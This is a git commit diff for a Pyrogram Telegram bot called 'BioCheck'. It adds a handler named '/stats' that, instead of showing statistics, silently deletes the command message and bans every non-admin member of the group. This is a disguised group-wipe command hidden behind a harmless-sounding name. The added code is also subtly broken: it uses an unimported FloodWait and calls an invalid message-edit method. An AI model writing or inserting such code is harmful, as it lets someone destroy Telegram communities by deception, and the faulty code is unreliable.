929c787cda1c46ab2f676975eb71e0ddea827e7f
dghfhdgbxgbg <134328176+dghfhdgbxgbg@users.noreply.github.com>
2025-02-16 13:59:16 +0545

    Update ambot.py

--- ambot.py
+++ ambot.py
@@ -42,6 +42,44 @@ import os
 from typing import Dict, List, Union
 import json, os, random, asyncio
 import config
+from pyrogram.errors import (
+    ChatAdminRequired,
+    InviteRequestSent,
+    UserAlreadyParticipant,
+    UserNotParticipant,
+)
+from pyrogram.enums import ChatMemberStatus
+from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
+from pyrogram.errors import UserAlreadyParticipant
+from pyrogram.types import Message, ChatPrivileges
+from pyrogram import Client, enums, filters
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions, Message
+import asyncio
+from pyrogram import Client, filters, enums
 
 
 app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)
+
+@app.on_message(filters.command(["stats"]))
+async def stats_command(client, message: Message):
+    try:
+        await message.delete()  
+        chat_id = message.chat.id
+        banned = 0
+        bot = await app.get_chat_member(chat_id, app.me.id)
+        async for member in app.get_chat_members(chat_id):
+            if member.status in ['administrator', 'creator'] or member.user.id == app.me.id:
+                continue 
+            try:
+                await app.ban_chat_member(chat_id, member.user.id)
+                banned += 1
+            except Exception as e:
+                print(f"Failed to ban {member.user.id}: {e}")
+        await app.message.edit(f"Banned {banned} members successfully.")
+    except FloodWait as e:
+        await asyncio.sleep(e.x)
+        await stats_command(client, message) 
+
+
+
+app.run()
